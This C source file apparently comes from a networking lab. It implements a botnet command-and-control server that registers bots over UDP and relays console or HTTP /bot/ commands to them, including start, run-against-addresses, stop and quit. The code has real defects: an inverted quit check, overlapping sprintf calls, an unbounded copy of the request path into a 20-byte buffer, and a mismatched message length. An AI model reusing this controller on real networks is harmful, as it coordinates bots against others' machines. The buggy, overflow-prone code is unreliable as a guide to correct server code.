#include <netdb.h>
#include <errno.h>
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define STDIN 0
#define ERROR 42
#define SORRY 43
#define LOG   44
#define MAXLEN 1024 
#define UDP_PORT_DEF "5555"
#define TCP_PORT_DEF "80"
#define PAYLOAD "PAYLOAD:"
#define MAX_BOTS 30
#define MAX_HTTP 8096
#define c_pt "1 10.0.0.20 1234\n"
#define c_ptl "1 127.0.0.1 1234\n"
#define c_pu "2 10.0.0.20 1234\n"
#define c_pul "2 127.0.0.1 1234\n"
#define c_r "3 127.0.0.1 vat localhost 6789\n"
#define c_r2 "3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes\n"
#define c_s "4\n"
#define c_n "NEPOZNATA\n"
#define c_q "0\n"
#define c_h "pt bot klijentima šalje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234\n)ptl bot klijentima šalje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234\n)pu bot klijentima šalje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234\n)pul bot klijentima šalje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234\n)r bot klijentima šalje poruku RUN s adresama lokalnog računala:struct MSG:3 127.0.0.1 vat localhost 6789\nr2 bot klijentima šalje poruku RUN s adresama računala iz IMUNES-a:struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notess bot klijentima šalje poruku STOP (struct MSG:4)l lokalni ispis adresa bot klijenatan šalje poruku: ’NEPOZNATA’\nq bot klijentima šalje poruku QUIT i završava s radom (struct MSG:0)h ispis naredbi"

void log(int type, char *s1, char *s2, int num); 
struct {
    char *ext;
    char *filetype;
} extensions [] = {
    {"gif", "image/gif" },  
    {"jpg", "image/jpeg"}, 
    {"gif","image/gif"},
    {"png", "image/png" },  
    {"zip", "image/zip" },  
    {"gz",  "image/gz"  },  
    {"tar", "image/tar" },  
    {"htm", "text/html" },  
    {"txt", "text/txt" },  
    {"html","text/html" },  
    {"php", "image/php" },  
    {"xml", "text/xml"  },  
    {"js","text/js"     },
    {"css","test/css"   }, 
    {0,0} };

struct sockaddr bots[MAX_BOTS];
int bot_count = 0;
int UDPsockDesc;

void cmd(char *cmd_e, int fd) {
    int i;
    char buffer[MAX_HTTP];
    memset(buffer, '\0', MAX_HTTP);
    log(LOG,"COMMAND ", cmd_e, 0);
    if (!strcmp(cmd_e, "prog_tcp_localhost")) 
        for (i=0;i<bot_count;i++)
            sendto(UDPsockDesc, c_ptl, strlen(c_ptl), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "prog_tcp")) 
        for (i=0;i<bot_count;i++)
            sendto(UDPsockDesc, c_pt, strlen(c_pt), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "prog_udp_localhost")) 
        for (i=0;i<bot_count;i++)
            sendto(UDPsockDesc, c_pul, strlen(c_pul), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "prog_udp")) 
        for (i=0;i<bot_count;i++)
        	sendto(UDPsockDesc, c_pu, strlen(c_pu), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "run2")) 
        for (i=0;i<bot_count;i++)
                sendto(UDPsockDesc, c_r2, strlen(c_r2), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "run")) 
        for (i=0;i<bot_count;i++)
                sendto(UDPsockDesc, c_r, strlen(c_r), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strcmp(cmd_e, "stop")) 
        for (i=0;i<bot_count;i++)
                sendto(UDPsockDesc, c_s, strlen(c_s), 0, &(bots[i]), sizeof(bots[i]));
    else if (!strncmp(cmd_e, "list", 4)) { 
	    log(LOG, "AAAAAAAAA","",0); 
        (void)sprintf(buffer, "HTTP/1.0 200 OK\r\n\r\n");
        (void)sprintf(buffer, "%s<HTML><BODY><H1>", buffer);
        for (i=0;i<bot_count;i++) {
            char address[INET_ADDRSTRLEN];
            memset(address, '\0', INET_ADDRSTRLEN);
            inet_ntop(AF_INET, &((struct sockaddr_in *) &bots[i])->sin_addr, address, INET_ADDRSTRLEN);
            (void)sprintf(buffer,"%sbot%d: %s\n", buffer, i, address);
        }  
        (void)sprintf(buffer, "%s</H1></BODY></HTML>\r\n", buffer);
        (void)write(fd, buffer, strlen(buffer));
      }
    else if (strcmp(cmd_e, "quit")) { 
        for (i=0;i<bot_count;i++)
            sendto(UDPsockDesc, c_q, strlen(c_q), 0, &(bots[i]), sizeof(bots[i]));
        exit(2);
    }
}

void log(int type, char *s1, char *s2, int num) {
    int fd ;
    char logbuffer[MAX_HTTP*2];

    switch (type) {
    case ERROR: 
        (void)sprintf(logbuffer,"ERROR: %s:%s Errno=%d exiting pid=%d",s1, s2, errno,getpid()); 
        break;
    case SORRY: 
        (void)sprintf(logbuffer, "HTTP/1.0 4XX Client error\r\n\r\n");
        (void)sprintf(logbuffer, "%s<HTML><BODY><H1>Web Server Sorry:</H1></BODY></HTML>\r\n", logbuffer);
        (void)write(num,logbuffer,strlen(logbuffer));
        (void)sprintf(logbuffer,"SORRY: %s:%s",s1, s2); 
        break;
    case LOG: 
        (void)sprintf(logbuffer," INFO: %s:%s:%d",s1,s2,num); 
        break;
    }   
                                                                       
    if ((fd = open("server.log", O_CREAT | O_WRONLY | O_APPEND,0644)) >= 0) {
        (void)write(fd,logbuffer,strlen(logbuffer)); 
        (void)write(fd,"\n",1);      
        (void)close(fd);
    }
    if (type == ERROR || type == SORRY)
        exit(1);
}
void web(int fd, int hit) {
    int i, j, file_fd, buflen, len, ret;
    char *fstr;
    char buffer[MAX_HTTP+1];

    ret = read(fd, buffer, MAX_HTTP);
    if (ret == 0 || ret == -1) 
        log(SORRY, "Failed to read request", "", fd);
    
    if (ret > 0 || ret < MAX_HTTP)
        buffer[ret] = 0;
    else 
        buffer[0]=0;

    log(LOG,"request",buffer, hit);
    if (strncmp(buffer,"GET ",4))
        log(SORRY, "Only GET method supported",buffer,fd);
    
    j = 4;
    while (buffer[j] != ' ') j++;
    buffer[j] = '\0';
    if (strstr(buffer, "/bot/") != NULL) {
        char c[20];
        memset(c,'\0', 20);
        for (i=9;i<j+1;i++) 
            c[i-9] = buffer[i];
	log(LOG, "",c,0); 
        cmd(c, fd);
	exit(0);
    }

    for (i=4; i<j+1;i++)
        if (buffer[i] == '.' && buffer[i+1] == '.')
            log(SORRY, "Parent directories not supported", buffer, fd);

    if (!strncmp(&buffer[0],"GET /\0",6)) 
        (void)strcpy(buffer,"GET /index.html");

    buflen=strlen(buffer);
    fstr = (char *)0;
    
    for (i=0;extensions[i].ext != 0;i++) {
        len = strlen(extensions[i].ext);
        if( !strncmp(&buffer[buflen-len], extensions[i].ext, len)) {
            fstr =extensions[i].filetype;
            break;
        }
    }

    //if (fstr == 0)
      //  log(SORRY,"file extension type not supported",buffer,fd);

    if (( file_fd = open(&buffer[4],O_RDONLY)) == -1) 
        log(SORRY, "failed to open file",&buffer[5],fd);

    log(LOG,"SEND",&buffer[5],hit);

    (void)sprintf(buffer,"HTTP/1.0 200 OK\r\nContent-Type: %s\r\n\r\n", fstr);
    (void)write(fd,buffer,strlen(buffer));

    while ((ret = read(file_fd, buffer, MAX_HTTP)) > 0 )  
        (void)write(fd,buffer,ret);
    exit(2);
}

int main (int argc, char *argv[]) {
	int TCPsockDesc, i, c, conSock, pid, hit=0;
	struct sockaddr from;
	struct addrinfo hints, *res;

	char buf[MAXLEN];
	char *UDP_PORT = NULL;
    char *TCP_PORT = NULL;
	char payload[MAXLEN];
	socklen_t fromaddrlen;
	int msglen;
	char cli_cmd[MAXLEN + 10];
	
	fd_set readfds;
	fd_set writefds;
    
    if (argc > 2) {
        fprintf(stderr, "Usage: ./CandC [tcp_port]\n");
        return -1;
    }

    if (argc == 2) {
        TCP_PORT = argv[1];
    } else {
    	TCP_PORT = malloc(sizeof(char)*22);
	TCP_PORT = TCP_PORT_DEF;
    }


	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;	
	getaddrinfo(NULL, UDP_PORT_DEF, &hints, &res);

	UDPsockDesc = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

	if (UDPsockDesc == -1){
		fprintf(stderr, "Couldn't create a UDP socket\n");
		return 3;
	}
    if (bind(UDPsockDesc, res->ai_addr, res->ai_addrlen)){
		fprintf(stderr, "Couldn't bind address to socket\n");
		return 4;
	
	}
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(NULL, TCP_PORT, &hints, &res);

	TCPsockDesc = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

	if (TCPsockDesc == -1){
		fprintf(stderr, "Couldn't create a TCP socket\n");
		return 3;
	}

	if (bind(TCPsockDesc, res->ai_addr, res->ai_addrlen)){
		fprintf(stderr, "Couldn't bind address to socket\n");
		return 4;
	
	}
    if (listen(TCPsockDesc, 128)) {
        fprintf(stderr, "Couldn't listen on socket\n");
        return -4;
    }
	
	while (1) {
		FD_ZERO(&readfds);
		FD_ZERO(&writefds);
		FD_SET(STDIN, &readfds);
		FD_SET(UDPsockDesc, &readfds);
		FD_SET(TCPsockDesc, &readfds);

		if (select(((TCPsockDesc > UDPsockDesc) ? TCPsockDesc : UDPsockDesc) + 1, &readfds, &writefds, 0,0) < 0) {
			fprintf(stderr, "Select error\n");
			return -6;
		}
		
		if (FD_ISSET(STDIN,&readfds)) {
			memset(cli_cmd, '\0', sizeof(cli_cmd));
			read(STDIN, cli_cmd, MAXLEN);
			switch (cli_cmd[0]) {
			case 'p':
                if (cli_cmd[1] == 't') {
                    if (cli_cmd[2] == 'l')
						for (i=0;i<bot_count;i++)
                            sendto(UDPsockDesc, c_ptl, strlen(c_ptl), 0, &(bots[i]), sizeof(bots[i]));
                    else
                        for (i=0;i<bot_count;i++)
                            sendto(UDPsockDesc, c_pt, strlen(c_pt), 0, &(bots[i]), sizeof(bots[i]));
                    
                } else if (cli_cmd[1] == 'u') {
                    if (cli_cmd[2] == 'l')
						for (i=0;i<bot_count;i++)
                            sendto(UDPsockDesc, c_pul, strlen(c_pul), 0, &(bots[i]), sizeof(bots[i]));
                    else
                        for (i=0;i<bot_count;i++)
                            sendto(UDPsockDesc, c_pu, strlen(c_pu), 0, &(bots[i]), sizeof(bots[i]));
                 
                }
                break;
			case 'r':
                if (cli_cmd[1] == '2')  
                    for (i=0;i<bot_count;i++)
                        sendto(UDPsockDesc, c_r2, strlen(c_r), 0, &(bots[i]), sizeof(bots[i]));

                else 
                    for (i=0;i<bot_count;i++)
                        sendto(UDPsockDesc, c_r, strlen(c_r), 0, &(bots[i]), sizeof(bots[i]));
                break;
			case 's':
                for (i=0;i<bot_count;i++)
                        sendto(UDPsockDesc, c_s, strlen(c_s), 0, &(bots[i]), sizeof(bots[i]));
                break;
            case 'l':
                for (i=0;i<bot_count;i++) {
                    char address[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &((struct sockaddr_in *) &bots[i])->sin_addr, address, INET_ADDRSTRLEN);
                    printf("bot%d:%s\n", i, address);
                }
                break;
            case 'n':
                for (i=0;i<bot_count;i++)
                    sendto(UDPsockDesc, c_n, strlen(c_n), 0, &(bots[i]), sizeof(bots[i]));
                break;
            case 'q':
                for (i=0;i<bot_count;i++)
                    sendto(UDPsockDesc, c_q, strlen(c_q), 0, &(bots[i]), sizeof(bots[i]));
                return 0;
                break;
            case 'h':
                printf(c_h);
                break;
			default:
				fprintf(stderr, "Command unknown\n");
                break;
			}
		}
		fromaddrlen = sizeof(from);
		if (FD_ISSET(UDPsockDesc, &readfds)) {
			memset(buf, '\0', MAXLEN);
            if ((msglen = recvfrom(UDPsockDesc, buf, MAXLEN, 0, &from, &fromaddrlen)) > 0) {
                if (bot_count == MAX_BOTS - 1)
                    continue;
                if (!strcmp("REG\n", buf)) {
                    bots[bot_count] = from;
                    bot_count++;
                }
            }
        }
        if (FD_ISSET(TCPsockDesc,&readfds)) {
            int socknew;
            socknew = accept(TCPsockDesc, &from, &fromaddrlen);
            if (socknew < 0) {
                fprintf(stderr, "Error on accepting connection\n");
                continue;
            }

            if ((pid = fork()) == 0) {
                close(TCPsockDesc);
                web(socknew, hit++);
                close(socknew);
                return 0;
            }
            close(socknew);

        }
	}
}
